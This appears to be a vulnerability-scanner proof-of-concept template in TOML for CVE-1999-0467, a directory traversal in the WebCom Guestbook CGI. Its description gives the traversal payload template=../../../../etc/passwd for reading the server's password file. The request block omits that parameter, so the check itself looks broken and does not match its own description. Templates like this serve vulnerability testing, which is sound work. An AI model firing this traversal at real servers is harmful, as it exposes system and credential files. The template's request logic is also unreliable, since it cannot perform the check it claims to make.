[info]
author = "ave"
description = "WebCom datakommunikation Guestbook 0.1 的 CGI 程序 wguest.exe 和 rguest.exe 未对 template 参数进行过滤，远程攻击者可通过目录遍历读取服务器任意文件。发送 GET 请求至 /cgi-bin/wguest.exe?template=../../../../etc/passwd 即可验证。"
id = "POC-AVE-1999-0128"
name = "WebCom CGI Guestbook 任意文件读取 PoC"
severity = "medium"
tags = ["ave-1999-0128"]
vuln_id = [
    "CVE-1999-0467",
    "AVE-1999-0128",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/cgi-bin/wguest.exe"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["root:"]
